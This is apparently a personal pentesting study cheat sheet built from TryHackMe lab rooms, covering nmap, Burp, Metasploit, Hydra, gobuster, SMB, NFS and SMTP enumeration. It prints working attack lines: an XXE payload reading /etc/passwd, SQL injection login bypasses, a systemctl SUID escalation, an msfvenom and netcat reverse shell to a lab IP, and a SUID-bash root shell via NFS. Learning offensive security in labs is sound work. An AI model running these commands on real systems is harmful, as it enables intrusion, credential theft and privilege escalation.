##nmap 
##tool used for checking which ports are open on a target
##nmap options/switches/flags
TARGET SPECIFICATION:
  Can pass hostnames, IP addresses, networks, etc.
  Ex: scanme.nmap.org, microsoft.com/24, 192.168.0.1; 10.0.0-255.1-254
  -iL <inputfilename>: Input from list of hosts/networks
  -iR <num hosts>: Choose random targets
  --exclude <host1[,host2][,host3],...>: Exclude hosts/networks
  --excludefile <exclude_file>: Exclude list from file
HOST DISCOVERY:
  -sL: List Scan - simply list targets to scan
  -sn: Ping Scan - disable port scan
  
  -Pn: Treat all hosts as online -- skip host discovery. Used for firewall evasion. Firewalls by default will block all
  ICMP messages.
  There are a variety of other switches which Nmap considers useful for firewall evasion. We will not go through these in detail, however, they can be found here.

The following switches are of particular note:

-f:- Used to fragment the packets (i.e. split them into smaller pieces) making it less likely that the packets will be detected by a firewall or IDS.
An alternative to -f, but providing more control over the size of the packets: 
--mtu <number>, accepts a maximum transmission unit size to use for the packets sent. This must be a multiple of 8.
--scan-delay <time>ms:- used to add a delay between packets sent. This is very useful if the network is unstable, but also for evading any time-based firewall/IDS triggers which may be in place.
--badsum:- this is used to generate in invalid checksum for packets. Any real TCP/IP stack would drop this packet, however, firewalls may potentially respond automatically, without bothering to check the checksum of the packet. As such, this switch can be used to determine the presence of a firewall/IDS.

  -PS/PA/PU/PY[portlist]: TCP SYN/ACK, UDP or SCTP discovery to given ports
  -PE/PP/PM: ICMP echo, timestamp, and netmask request discovery probes
  -PO[protocol list]: IP Protocol Ping
  -n/-R: Never do DNS resolution/Always resolve [default: sometimes]
  --dns-servers <serv1[,serv2],...>: Specify custom DNS servers
  --system-dns: Use OS's DNS resolver
  --traceroute: Trace hop path to each host
SCAN TECHNIQUES:
  -sS/sT/sA/sW/sM: TCP SYN/Connect()/ACK/Window/Maimon scans
  -sU: UDP Scan
  -sN/sF/sX: TCP Null, FIN, and Xmas scans
  --scanflags <flags>: Customize TCP scan flags
  -sI <zombie host[:probeport]>: Idle scan
  -sY/sZ: SCTP INIT/COOKIE-ECHO scans
  -sO: IP protocol scan
  -b <FTP relay host>: FTP bounce scan
PORT SPECIFICATION AND SCAN ORDER:
  -p <port ranges>: Only scan specified ports
    Ex: -p22; -p1-65535; -p U:53,111,137,T:21-25,80,139,8080,S:9
  --exclude-ports <port ranges>: Exclude the specified ports from scanning
  -F: Fast mode - Scan fewer ports than the default scan
  -r: Scan ports consecutively - don't randomize
  --top-ports <number>: Scan <number> most common ports
  --port-ratio <ratio>: Scan ports more common than <ratio>
SERVICE/VERSION DETECTION:
  -sV: Probe open ports to determine service/version info
  --version-intensity <level>: Set from 0 (light) to 9 (try all probes)
  --version-light: Limit to most likely probes (intensity 2)
  --version-all: Try every single probe (intensity 9)
  --version-trace: Show detailed version scan activity (for debugging)
SCRIPT SCAN:
  -sC: equivalent to --script=default
  --script=<Lua scripts>: <Lua scripts> is a comma separated list of
           directories, script-files or script-categories
  --script-args=<n1=v1,[n2=v2,...]>: provide arguments to scripts
  --script-args-file=filename: provide NSE script args in a file
  --script-trace: Show all data sent and received
  --script-updatedb: Update the script database.
  --script-help=<Lua scripts>: Show help about scripts.
           <Lua scripts> is a comma-separated list of script-files or
           script-categories.
OS DETECTION:
  -O: Enable OS detection
  --osscan-limit: Limit OS detection to promising targets
  --osscan-guess: Guess OS more aggressively
TIMING AND PERFORMANCE:
  Options which take <time> are in seconds, or append 'ms' (milliseconds),
  's' (seconds), 'm' (minutes), or 'h' (hours) to the value (e.g. 30m).
  -T<0-5>: Set timing template (higher is faster)
  --min-hostgroup/max-hostgroup <size>: Parallel host scan group sizes
  --min-parallelism/max-parallelism <numprobes>: Probe parallelization
  --min-rtt-timeout/max-rtt-timeout/initial-rtt-timeout <time>: Specifies
      probe round trip time.
  --max-retries <tries>: Caps number of port scan probe retransmissions.
  --host-timeout <time>: Give up on target after this long
  --scan-delay/--max-scan-delay <time>: Adjust delay between probes
  --min-rate <number>: Send packets no slower than <number> per second
  --max-rate <number>: Send packets no faster than <number> per second
FIREWALL/IDS EVASION AND SPOOFING:
  -f; --mtu <val>: fragment packets (optionally w/given MTU)
  -D <decoy1,decoy2[,ME],...>: Cloak a scan with decoys
  -S <IP_Address>: Spoof source address
  -e <iface>: Use specified interface
  -g/--source-port <portnum>: Use given port number
  --proxies <url1,[url2],...>: Relay connections through HTTP/SOCKS4 proxies
  --data <hex string>: Append a custom payload to sent packets
  --data-string <string>: Append a custom ASCII string to sent packets
  --data-length <num>: Append random data to sent packets
  --ip-options <options>: Send packets with specified ip options
  --ttl <val>: Set IP time-to-live field
  --spoof-mac <mac address/prefix/vendor name>: Spoof your MAC address
  --badsum: Send packets with a bogus TCP/UDP/SCTP checksum
OUTPUT:
  -oN/-oX/-oS/-oG <file>: Output scan in normal, XML, s|<rIpt kIddi3,
     and Grepable format, respectively, to the given filename.
  -oA <basename>: Output in the three major formats at once
  -v: Increase verbosity level (use -vv or more for greater effect)
  -d: Increase debugging level (use -dd or more for greater effect)
  --reason: Display the reason a port is in a particular state
  --open: Only show open (or possibly open) ports
  --packet-trace: Show all packets sent and received
  --iflist: Print host interfaces and routes (for debugging)
  --append-output: Append to rather than clobber specified output files
  --resume <filename>: Resume an aborted scan
  --stylesheet <path/URL>: XSL stylesheet to transform XML output to HTML
  --webxml: Reference stylesheet from Nmap.Org for more portable XML
  --no-stylesheet: Prevent associating of XSL stylesheet w/XML output
MISC:
  -6: Enable IPv6 scanning
  -A: Enable OS detection, version detection, script scanning, and traceroute
  --datadir <dirname>: Specify custom Nmap data file location
  --send-eth/--send-ip: Send using raw ethernet frames or IP packets
  --privileged: Assume that the user is fully privileged
  --unprivileged: Assume the user lacks raw socket privileges
  -V: Print version number
  -h: Print this help summary page.
EXAMPLES:
  nmap -v -A scanme.nmap.org
  nmap -v -sn 192.168.0.0/16 10.0.0.0/8
  nmap -v -iR 10000 -Pn -p 80
  nmap -p 22 192.168.5.102
  nmap -p 50-60 192.168.5.102
  nmap --exclude-ports 1-100 192.168.5.102
  nmap --script http-headers scanme.nmap.org

When port scanning with Nmap, there are three basic scan types. These are:

TCP Connect Scans (-sT)
SYN "Half-open" Scans (-sS)
UDP Scans (-sU)

Additionally there are several less common port scan types, some of which we will also cover (albeit in less detail). These are:

TCP Null Scans (-sN)
TCP FIN Scans (-sF)
TCP Xmas Scans (-sX)

Due to this difficulty in identifying whether a UDP port is actually open, UDP scans tend to be incredibly slow in comparison to the various TCP scans (in the region of 20 minutes to scan the first 1000 ports, with a good connection). 
For this reason it's usually good practice to run an Nmap scan with --top-ports <number> enabled. For example, scanning with  nmap -sU --top-ports 20 <target>. 
Will scan the top 20 most commonly used UDP ports, resulting in a much more acceptable scan time.

##Searching for nmap scripts 

/usr/share/nmap/scripts
/usr/share/nmap/scripts/script.db
grep "ftp" /usr/share/nmap/scripts/script.db
ls -l /usr/share/nmap/scripts/*ftp*
grep "safe" /usr/share/nmap/scripts/script.db

##Installing new nmap scripts 

sudo apt update && sudo apt install nmap 
sudo wget -O /usr/share/nmap/scripts/<script-name>.nse https://svn.nmap.org/nmap/scripts/<script-name>.nse
Followed by: 
nmap --script-updatedb


##BURP Suite
##Put simply: Burp Suite is a framework written in Java that aims to provide a one-stop-shop for web application penetration ##assessments. Burp Suite is also very commonly used when assessing mobile applications, as the same features which make it ##so attractive for web app testing translate almost perfectly into testing the APIs (Application Programming Interfaces) ##powering most mobile apps.
Whilst Burp Community has a relatively limited feature-set compared to the Professional edition, it still has many superb tools available. These include:

Proxy: The most well-known aspect of Burp Suite, the Burp Proxy allows us to intercept and modify requests/responses when interacting with web applications.

Repeater: The second most well-known Burp feature -- Repeater -- allows us to capture, modify, then resend the same request numerous times. This feature can be absolutely invaluable, especially when we need to craft a payload through trial and error (e.g. in an SQLi -- Structured Query Language Injection) or when testing the functionality of an endpoint for flaws.

Intruder: Although harshly rate-limited in Burp Community, Intruder allows us to spray an endpoint with requests. This is often used for bruteforce attacks or to fuzz endpoints.

Decoder: Though less-used than the previously mentioned features, Decoder still provides a valuable service when transforming data -- either in terms of decoding captured information, or encoding a payload prior to sending it to the target. Whilst there are other services available to do the same job, doing this directly within Burp Suite can be very efficient.

Comparer: As the name suggests, Comparer allows us to compare two pieces of data at either word or byte level. Again, this is not something that is unique to Burp Suite, but being able to send (potentially very large) pieces of data directly into a comparison tool with a single keyboard shortcut can speed things up considerably.
Sequencer: We usually use Sequencer when assessing the randomness of tokens such as session cookie values or other supposedly random generated data. If the algorithm is not generating secure random values, then this could open up some devastating avenues for attack.


##METASPLOIT

The main components of the Metasploit Framework can be summarized as follows;

msfconsole: The main command-line interface.

Modules: supporting modules such as exploits, scanners, payloads, etc.

Tools: Stand-alone tools that will help vulnerability research, vulnerability assessment, or penetration testing. Some of these tools are msfvenom, pattern_create and pattern_offset. We will cover msfvenom within this module, but pattern_create and pattern_offset are tools useful in exploit development which is beyond the scope of this module.


START:
	msfconsole
LIST ITEMS:
	ls
HELP:
	help
USING EXPLOIT:
	use 
SEEING EXPLOIT OPTIONS:
	show options
	show payloads
	info
SEARCH:
	search
SET PARAMETER VALUE:
	set
##To set a parameter used globally. Same for all exploits.	
	setg
UNSET PARAMETER VALUE:
	unset <all>
	unset payload
##To remove parameters for all exploits
	unsetg <all>
START EXPLOIT:
	run
	exploit 
##To run exploit in the background
	exploit -z 
BACKGROUND THE PROCESS AND GO BACK TO MAIN PAGE
	background
LIST ACTIVE SESSIONS
	sessions
	sessions -<number>
EXAMPLES:
	use exploit/windows/smb/ms17_010_eternalblue
	info exploit/windows/smb/ms17_010_eternalblue
	search ms17-010
	use auxiliary/admin/smb/ms17_010_command
##If you want to use an exploit listed from the search list
	use 1
	search type:auxiliary telnet
TO GO BACK:
	back
##After loading the exploit use:
	options
##The options list will give you the required options and information about how to use it.

##HYDRA
##Used for brute forcing passswords

FTP BRUTEFORCING:

hydra -l user -P passlist.txt ftp://10.10.118.1
SSH:
﻿hydra -l <username> -P <full path to pass> 10.10.118.1 -t 4 ssh
POST WEB FORM:
We can use Hydra to bruteforce web forms too, you will have to make sure you know which type of request its making - a GET or POST methods are normally used. You can use your browsers network tab (in developer tools) to see the request types, or simply view the source code.

Below is an example Hydra command to brute force a POST login form:
##Be aware the /login path must be crafted to the webpage and can be different for each website
hydra -l <username> -P <wordlist> 10.10.118.1 http-post-form "/login:username=^USER^&password=^PASS^:Your username or password is incorrect." -V

##Accessing SQL files

##Check what type of file it is
	file <filename>
##Open with SQLLite
	sqlite3 <database-name>
##Query what tables are available
	.tables
##Query the specific tables to see the table information. 
	PRAGMA table_info(customers); 
##Select everything from table customers
	SELECT * FROM customers;
##You can use online or offline tools for password cracking
 
 
 ##Using XXE to request files from a system-dns
 ##In this case the website might display the contents of the passwd folder by using this payload
 
 <?xml version="1.0"?>
<!DOCTYPE root [<!ENTITY read SYSTEM 'file:///etc/passwd'>]>
<root>&read;</root>

##Default ssh key location
	home/<username>/.ssh/id_rsa

##Access control attack examples
##SQL modificaiton 
Scenario #1: The application uses unverified data in a SQL call that is accessing account information:
##In this case attacker uses JAVA to modify parament of an account psmt - An object that represents a precompiled SQL statement.
A SQL statement is precompiled and stored in a PreparedStatement object. This object can then be used to efficiently execute this statement multiple times.

pstmt.setString(1, request.getParameter("acct"));
ResultSet results = pstmt.executeQuery( );

An attacker simply modifies the ‘acct’ parameter in the browser to send whatever account number they want. If not properly verified, the attacker can access any user’s account.
http://example.com/app/accountInfo?acct=notmyacct

Scenario #2: An attacker simply force browses to target URLs. Admin rights are required for access to the admin page.
http://example.com/app/getappInfo
http://example.com/app/admin_getappInfo

##XSS
XSS Explained
Cross-site scripting, also known as XSS is a security vulnerability typically found in web applications. It’s a type of injection which can allow an attacker to execute malicious scripts and have it execute on a victim’s machine.

A web application is vulnerable to XSS if it uses unsanitized user input. XSS is possible in Javascript, VBScript, Flash and CSS. There are three main types of cross-site scripting:
Stored XSS - the most dangerous type of XSS. This is where a malicious string originates from the website’s database. This often happens when a website allows user input that is not sanitised (remove the "bad parts" of a users input) when inserted into the database.
Reflected XSS - the malicious payload is part of the victims request to the website. The website includes this payload in response back to the user. To summarise, an attacker needs to trick a victim into clicking a URL to execute their malicious payload.
DOM-Based XSS - DOM stands for Document Object Model and is a programming interface for HTML and XML documents. It represents the page so that programs can change the document structure, style and content. A web page is a document and this document can be either displayed in the browser window or as the HTML source.
For more XSS explanations and exercises, check out the XSS room.

XSS Payloads
Remember, cross-site scripting is a vulnerability that can be exploited to execute malicious Javascript on a victim’s machine. Check out some common payloads types used:

Popup's (<script>alert(“Hello World”)</script>) - Creates a Hello World message popup on a users browser.
Writing HTML (document.write) - Override the website's HTML to add your own (essentially defacing the entire page).
XSS Keylogger (http://www.xss-payloads.com/payloads/scripts/simplekeylogger.js.html) - You can log all keystrokes of a user, capturing their password and other sensitive information they type into the webpage.
Port scanning (http://www.xss-payloads.com/payloads/scripts/portscanapi.js.html) - A mini local port scanner (more information on this is covered in the TryHackMe XSS room).
XSS-Payloads.com (http://www.xss-payloads.com/) is a website that has XSS related Payloads, Tools, Documentation and more. You can download XSS payloads that take snapshots from a webcam or even get a more capable port and network scanner.

##Insecure Deserialisation

This definition is still quite broad to say the least. Simply, insecure deserialization is replacing data processed by an application with malicious code; allowing anything from DoS (Denial of Service) to RCE (Remote Code Execution) that the attacker can use to gain a foothold in a pentesting scenario.

Serialisation is the process of converting objects used in programming into simpler, compatible formatting for transmitting between systems or networks for further processing or storage.

Alternatively, deserialisation is the reverse of this; converting serialised information into their complex form - an object that the application will understand.

##Listening on a port for a response using netcat
	nc -lvnp 4444
	nc [<options>] <host> <port>

##Options for netcat
-4	Protocol	Use IPv4 only.
-6	Protocol	Use IPv6 only.
-U
--unixsock	Protocol	Use Unix domain sockets.
-u
--udp	Protocol	Use UDP connection.
-g <hop1, hop2,...>	Connect mode	Set hops for loose source routing in IPv4. Hops are IP addresses or hostnames.
-p <port>
--source-port <port>	Connect mode	Binds the Netcat source port to <port>.
-s <host>
--source <host>	Connect mode	Binds the Netcat host to <host>.
-l
--listen	Listen mode	Listens for connections instead of using connect mode.
-k
--keep-open	Listen mode	Keeps the connection open for multiple simultaneous connections.
-v
--verbose	Output	Sets verbosity level. Use multiple times to increase verbosity.
-z	Output	Report connection status without establishing a connection.

##Using known exploits : go to exploit-db 
Exploit-DB 
https://www.exploit-db.com

##To start python scripts use
	python3 <python file>
	


##OWASP JUICE SHOP

##Exploits
SQL Injection
SQL Injection is when an attacker enters a malicious or malformed query to either retrieve or tamper data from a database. And in some cases, log into accounts.

After we navigate to the login page, enter some data into the email and password fields.



 Before clicking submit, make sure Intercept mode is on.

This will allow us to see the data been sent to the server!


Change the email and password fiel in Burp to:

{"email":"' or l=l--","password":"a"}

We will now change the "a" next to the email to: ' or 1=1-- and forward it to the server.

Why does this work?

The character ' will close the brackets in the SQL query
'OR' in a SQL statement will return true if either side of it is true. As 1=1 is always true, the whole statement is true. Thus it will tell the server that the email is valid, and log us into user id 0, which happens to be the administrator account.
The -- character is used in SQL to comment out data, any restrictions on the login will no longer work as they are interpreted as a comment. This is like the # and // comment in python and javascript respectively.

Similar to what we did in Question #1, we will now log into Bender's account! Capture the login request again, but this time we will put: bender@juice-sh.op'-- as the email. 

{"email":"bender@juice-sh.op'--","password":"a"}

Now, forward that to the server!

But why don't we put the 1=1?

Well, as the email address is valid (which will return true), we do not need to force it to be true. Thus we are able to use '-- to bypass the login system. Note the 1=1 can be used when the email or username is not known or invalid.

email:admin@juice-sh.op
password :admin123

We have used SQL Injection to log into the Administrator account but we still don't know the password. Let's try a brute-force attack! We will once again capture a login request, but instead of sending it through the proxy, we will send it to Intruder.

Go to Positions and then select the Clear § button. In the password field place two § inside the quotes. To clarify, the § § is not two sperate inputs but rather Burp's implementation of quotations e.g. "". The request should look like the image below. 



For the payload, we will be using the best1050.txt from Seclists. (Which can be installed via: apt-get install seclists)

You can load the list from: /usr/share/wordlists/SecLists/Passwords/Common-Credentials/best1050.txt

Once the file is loaded into Burp, start the attack. You will want to filter for the request by status.

A failed request will receive a 401 Unauthorized   

Whereas a successful request will return a 200 OK. 
Command Injection
Command Injection is when web applications take input or user-controlled data and run them as system commands. An attacker may tamper with this data to execute their own system commands. This can be seen in applications that perform misconfigured ping tests. 

Email Injection
Email injection is a security vulnerability that allows malicious users to send email messages without prior authorization by the email server. These occur when the attacker adds extra data to fields, which are not interpreted by the server correctly. 

##Sensitive Data Exposure OWASP

##Poison NULL byte 
%00 -it is used in programming
%2500 -it is same but encoded to be used in web applications

By inserting %2500 we can bypass 403 error
A Poison Null Byte is actually a NULL terminator. By placing a NULL character in the string at a certain byte, the string will tell the server to terminate at that point, nulling the rest of the string. 


##GoBuster

GoBuster is a tool used to brute-force URIs (directories and files), DNS subdomains and virtual host names. For this machine, we will focus on using it to brute-force directories.

Download GoBuster here, or if you're on Kali Linux 2020.1+ run sudo apt-get install gobuster

To get started, you will need a wordlist for GoBuster (which will be used to quickly go through the wordlist to identify if there is a public directory available. If you are using Kali Linux you can find many wordlists under /usr/share/wordlists.

gobuster dir -u http://<ip>:3333 -w <word list location>

The syntax is accessing the server via port 3333

GoBuster flag	Description
-e	Print the full URLs in your console
-u	The target URL
-w	Path to your wordlist
-U and -P	Username and Password for Basic Auth
-p <x>	Proxy to use for requests
-c <http cookies>	Specify a cookie for simulating your auth

##Vulnersity 


To find all SUID files on a machine 

 find / -user root -perm -4000 -exec ls -ldb {} \;
 
 Use GTFOBins
 
 go to /bin/directory
 TF=$(mktemp).service
echo '[Service]
Type=oneshot
ExecStart=/bin/sh -c "cat /root/root.txt > /tmp/output"
[Install]
WantedBy=multi-user.target' > $TF
./systemctl link $TF
./systemctl enable --now $TF

##Enumerating SMB

num4Linux

Enum4linux is a tool used to enumerate SMB shares on both Windows and Linux systems. It is basically a wrapper around the tools in the Samba package and makes it easy to quickly extract information from the target pertaining to SMB. It's installed by default on Parrot and Kali, however if you need to install it, you can do so from the official github.

The syntax of Enum4Linux is nice and simple: "enum4linux [options] ip"

TAG            FUNCTION

-U             get userlist
-M             get machine list
-N             get namelist dump (different from -U and-M)
-S             get sharelist
-P             get password policy information
-G             get group and member list

-a             all of the above (full basic enumeration)

SMBClient

Because we're trying to access an SMB share, we need a client to access resources on servers. We will be using SMBClient because it's part of the default samba suite. While it is available by default on Kali and Parrot, if you do need to install it, you can find the documentation here.

We can remotely access the SMB share using the syntax:

smbclient //[IP]/[SHARE]

Followed by the tags:

-U [name] : to specify the user

-p [port] : to specify the port

smbclient //10.10.10.2/secret -U suit -p 445

SMB commands
cd
more -same as cat
mget - download file 

Get id_rsa for public key
Change permissions to chmod 600 to use it in ssh connection 
To use it in ssh connection use the following command

ssh -i <path to id_rsa> <username>@<ip,domain> 

##Telnet
By default it isport 23.

Command:
telnet <ip> <port>

##Enumerating Telnet 
Use nmap 
nmap -A -T4 <ip> -p1-10000 
Gather information about the user.

Start the listener:
sudo tcpdump ip proto \\icmp -i eth0 (or tun0)

Use msvenom to generate reverse shell payload:

msfvenom -p cmd/unix/reverse_netcat lhost=[local tun0 ip] lport=4444 R

copy and paste the reverse shell script with .RUN to execute it as a command in telnet session 
.RUN mkfifo /tmp/wlbt; nc 10.10.238.24 4444 0</tmp/wlbt | /bin/sh >/tmp/wlbt 2>&1; rm /tmp/wlbt

##FTP enumeration
To connect to FTP port using anonymous connection use command:

ftp <ip>

To read file in the console use :

get <filename> - 

To Download

get <filename>

You can bruteforce the password using Hydra 

Method Breakdown

So, from our enumeration stage, we know:

    - There is an FTP server running on this machine

    - We have a possible username

Using this information, let's try and bruteforce the password of the FTP Server.

Hydra

Hydra is a very fast online password cracking tool, which can perform rapid dictionary attacks against more than 50 Protocols, including Telnet, RDP, SSH, FTP, HTTP, HTTPS, SMB, several databases and much more. Hydra comes by default on both Parrot and Kali, however if you need it, you can find the GitHub here.
The syntax for the command we're going to use to find the passwords is this:

"hydra -t 4 -l dale -P /usr/share/wordlists/rockyou.txt -vV <target IP> <protocol>"

Let's break it down:

SECTION             FUNCTION

hydra                   Runs the hydra tool

-t 4                    Number of parallel connections per target

-l [user]               Points to the user who's account you're trying to compromise

-P [path to dictionary] Points to the file containing the list of possible passwords

-vV                     Sets verbose mode to very verbose, shows the login+pass combination for each attempt

[machine IP]            The IP address of the target machine

ftp / protocol          Sets the protocol


##NFS Exploitation

What is NFS?

NFS stands for "Network File System" and allows a system to share directories and files with others over a network. By using NFS, users and programs can access files on remote systems almost as if they were local files. It does this by mounting all, or a portion of a file system on a server. The portion of the file system that is mounted can be accessed by clients with whatever privileges are assigned to each file.

How does NFS work?

Computer network - Vector stencils library | Computers ...

We don't need to understand the technical exchange in too much detail to be able to exploit NFS effectively- however if this is something that interests you, I would recommend this resource: https://docs.oracle.com/cd/E19683-01/816-4882/6mb2ipq7l/index.html

First, the client will request to mount a directory from a remote host on a local directory just the same way it can mount a physical device. The mount service will then act to connect to the relevant mount daemon using RPC.

The server checks if the user has permission to mount whatever directory has been requested. It will then return a file handle which uniquely identifies each file and directory that is on the server.

If someone wants to access a file using NFS, an RPC call is placed to NFSD (the NFS daemon) on the server. This call takes parameters such as:

 The file handle
 The name of the file to be accessed
 The user's, user ID
 The user's group ID
These are used in determining access rights to the specified file. This is what controls user permissions, I.E read and write of files.

What runs NFS?

Using the NFS protocol, you can transfer files between computers running Windows and other non-Windows operating systems, such as Linux, MacOS or UNIX.

A computer running Windows Server can act as an NFS file server for other non-Windows client computers. Likewise, NFS allows a Windows-based computer running Windows Server to access files stored on a non-Windows NFS server.

##Mounting NFS shares

Your client’s system needs a directory where all the content shared by the host server in the export folder can be accessed. You can create
this folder anywhere on your system. Once you've created this mount point, you can use the "mount" command to connect the NFS share to the mount point on your machine like so:

sudo mount -t nfs IP:share /tmp/mount/ -nolock

sudo mount -t nfs 10.10.10.10:home /tmp/mount/ -nolock

Let's break this down

Tag	Function
sudo	Run as root
mount	Execute the mount command
-t nfs	Type of device to mount, then specifying that it's NFS
IP:share	The IP Address of the NFS server, and the name of the share we wish to mount
-nolock	Specifies not to use NLM locking

##List the NFS shares command:

/usr/sbin/showmount -e [IP] 

First, use "mkdir /tmp/mount" to create a directory on your machine to mount the share to. This is in the /tmp directory- so be aware that it will be removed on restart.

hat is root_squash?

By default, on NFS shares- Root Squashing is enabled, and prevents anyone connecting to the NFS share from having root access to the NFS volume. Remote root users are assigned a user “nfsnobody” when connected, which has the least local privileges. Not what we want. However, if this is turned off, it can allow the creation of SUID bit files, allowing a remote user root access to the connected system.

SUID
So, what are files with the SUID bit set? Essentially, this means that the file or files can be run with the permissions of the file(s) owner/group. In this case, as the super-user. We can leverage this to get a shell with these privileges!

Method

This sounds complicated, but really- provided you're familiar with how SUID files work, it's fairly easy to understand. We're able to upload files to the NFS share, and control the permissions of these files. We can set the permissions of whatever we upload, in this case a bash shell executable. We can then log in through SSH, as we did in the previous task- and execute this executable to gain a root shell!

The Executable

Due to compatibility reasons, we'll use a standard Ubuntu Server 18.04 bash executable, the same as the server's- as we know from our nmap scan. You can download it here.

Mapped Out Pathway:

If this is still hard to follow, here's a step by step of the actions we're taking, and how they all tie together to allow us to gain a root shell:


    NFS Access ->

        Gain Low Privilege Shell ->

            Upload Bash Executable to the NFS share ->

                Set SUID Permissions Through NFS Due To Misconfigured Root Squash ->

                    Login through SSH ->

                        Execute SUID Bit Bash Executable ->

                            ROOT ACCESS
							

First, change directory to the mount point on your machine, where the NFS share should still be mounted, and then into the user's home directory.

Download the bash executable to your Downloads directory. Then use "cp ~/Downloads/bash ." to copy the bash executable to the NFS share. The copied bash shell must be owned by a root user, you can set this using:

sudo chown root bash


Now, we're going to add the SUID bit permission to the bash executable we just copied to the share using "sudo chmod +[permission] bash". What letter do we use to set the SUID bit set using chmod?

sudo chmod +s bash or chmod 777 bash

Let's do a sanity check, let's check the permissions of the "bash" executable using "ls -la bash". 
Should look  like:

-rwsr-sr-x

Now, SSH into the machine as the user. List the directory to make sure the bash executable is there. Now, the moment of truth. Lets run it with "./bash -p". The -p persists the permissions, so that it can run as root with SUID- as otherwise bash will sometimes drop the permissions.

cd /root to change to root user

##Exploiting SMTP

What is SMTP?

SMTP stands for "Simple Mail Transfer Protocol". It is utilised to handle the sending of emails. In order to support email services, a protocol pair is required, comprising of SMTP and POP/IMAP. Together they allow the user to send outgoing mail and retrieve incoming mail, respectively.

The SMTP server performs three basic functions:

 It verifies who is sending emails through the SMTP server.
 It sends the outgoing mail
 If the outgoing mail can't be delivered it sends the message back to the sender
Most people will have encountered SMTP when configuring a new email address on some third-party email clients, such as Thunderbird; as when you configure a new email client, you will need to configure the SMTP server configuration in order to send outgoing emails.
POP and IMAP

POP, or "Post Office Protocol" and IMAP, "Internet Message Access Protocol" are both email protocols who are responsible for the transfer of email between a client and a mail server. The main differences is in POP's more simplistic approach of downloading the inbox from the mail server, to the client. Where IMAP will synchronise the current inbox, with new mail on the server, downloading anything new. This means that changes to the inbox made on one computer, over IMAP, will persist if you then synchronise the inbox from another computer. The POP/IMAP server is responsible for fulfiling this process.

How does SMTP work?

Email delivery functions much the same as the physical mail delivery system. The user will supply the email (a letter) and a service (the postal delivery service), and through a series of steps- will deliver it to the recipients inbox (postbox). The role of the SMTP server in this service, is to act as the sorting office, the email (letter) is picked up and sent to this server, which then directs it to the recipient.
We can map the journey of an email from your computer to the recipient’s like this:



1. The mail user agent, which is either your email client or an external program. connects to the SMTP server of your domain, e.g. smtp.google.com. This initiates the SMTP handshake. This connection works over the SMTP port- which is usually 25. Once these connections have been made and validated, the SMTP session starts.

2. The process of sending mail can now begin. The client first submits the sender, and recipient's email address- the body of the email and any attachments, to the server.

3. The SMTP server then checks whether the domain name of the recipient and the sender is the same.

4. The SMTP server of the sender will make a connection to the recipient's SMTP server before relaying the email. If the recipient's server can't be accessed, or is not available- the Email gets put into an SMTP queue.

5. Then, the recipient's SMTP server will verify the incoming email. It does this by checking if the domain and user name have been recognised. The server will then forward the email to the POP or IMAP server, as shown in the diagram above.

6. The E-Mail will then show up in the recipient's inbox.

This is a very simplified version of the process, and there are a lot of sub-protocols, communications and details that haven't been included. If you're looking to learn more about this topic, this is a really friendly to read breakdown of the finer technical details- I actually used it to write this breakdown:

https://computer.howstuffworks.com/e-mail-messaging/email3.htm

What runs SMTP?

SMTP Server software is readily available on Windows server platforms, with many other variants of SMTP being available to run on Linux.


Okay, now we know what port we should be targeting, let's start up Metasploit. What command do we use to do this?

If you would like some more help, or practice using, Metasploit, Darkstar has an amazing room on Metasploit that you can check out here:

https://tryhackme.com/room/rpmetasploit

msfconsole
Let's search for the module "smtp_version", what's it's full module name?
auxiliary/scanner/smtp/smtp_version
Great, now- select the module and list the options. How do we do this?

options
Have a look through the options, does everything seem correct? What is the option we need to set?

rhosts
Set that to the correct value for your target machine. Then run the exploit. What's the system mail name?

polosmtp.home
What Mail Transfer Agent (MTA) is running the SMTP server? This will require some external research.

postfix
Good! We've now got a good amount of information on the target system to move onto the next stage. Let's search for the module "smtp_enum", what's it's full module name?
auxiliary/scanner/smtp/smtp_enum
We're going to be using the "top-usernames-shortlist.txt" wordlist from the Usernames subsection of seclists (/usr/share/wordlists/SecLists/Usernames if you have it installed).

Seclists is an amazing collection of wordlists. If you're running Kali or Parrot you can install seclists with: "sudo apt install seclists" Alternatively, you can download the repository from here.

What option do we need to set to the wordlist's path?

USER_FILE
Once we've set this option, what is the other essential paramater we need to set?

rhosts
Now, run the exploit, this may take a few minutes, so grab a cup of tea, coffee, water. Keep yourself hydrated!

No answer needed
Okay! Now that's finished, what username is returned?

administrator

What do we know?

Okay, at the end of our Enumeration section we have a few vital pieces of information:

1. A user account name

2. The type of SMTP server and Operating System running.

We know from our port scan, that the only other open port on this machine is an SSH login. We're going to use this information to try and bruteforce the password of the SSH login for our user using Hydra.

Preparation

It's advisable that you exit Metasploit to continue the exploitation of this section of the room. Secondly, it's useful to keep a note of the information you gathered during the enumeration stage, to aid in the exploitation.

Hydra

There is a wide array of customisability when it comes to using Hydra, and it allows for adaptive password attacks against of many different services, including SSH. Hydra comes by default on both Parrot and Kali, however if you need it, you can find the GitHub here.

Hydra uses dictionary attacks primarily, both Kali Linux and Parrot OS have many different wordlists in the "/usr/share/wordlists" directory- if you'd like to browse and find a different wordlists to the widely used "rockyou.txt". Likewise I recommend checking out SecLists for a wider array of other wordlists that are extremely useful for all sorts of purposes, other than just password cracking. E.g. subdomain enumeration
The syntax for the command we're going to use to find the passwords is this:

"hydra -t 16 -l <Username> -P /usr/share/wordlists/rockyou.txt -vV <target IP> <protocol>"

Let's break it down:



SECTION	FUNCTION
hydra	Runs the hydra tool
-t 16
Number of parallel connections per target
-l [user]	Points to the user who's account you're trying to compromise
-P [path to dictionary]	Points to the file containing the list of possible passwords
-vV
Sets verbose mode to very verbose, shows the login+pass combination for each attempt
[machine IP]	The IP address of the target machine
ssh / protocol	Sets the protocol

##Exploting MySQL 

What is MySQL?

In its simplest definition, MySQL is a relational database management system (RDBMS) based on Structured Query Language (SQL). Too many acronyms? Let's break it down:

Database:

A database is simply a persistent, organised collection of structured data

RDBMS:

A software or service used to create and manage databases based on a relational model. The word "relational" just means that the data stored in the dataset is organised as tables. Every table relates in some way to each other's "primary key" or other "key" factors.

SQL:

MYSQL is just a brand name for one of the most popular RDBMS software implementations. As we know, it uses a client-server model. But how do the client and server communicate? They use a language, specifically the Structured Query Language (SQL).

Many other products, such as PostgreSQL and Microsoft SQL server, have the word SQL in them. This similarly signifies that this is a product utilising the Structured Query Language syntax.

How does MySQL work?

MySQL, as an RDBMS, is made up of the server and utility programs that help in the administration of MySQL databases.

The server handles all database instructions like creating, editing, and accessing data. It takes and manages these requests and communicates using the MySQL protocol. This whole process can be broken down into these stages:

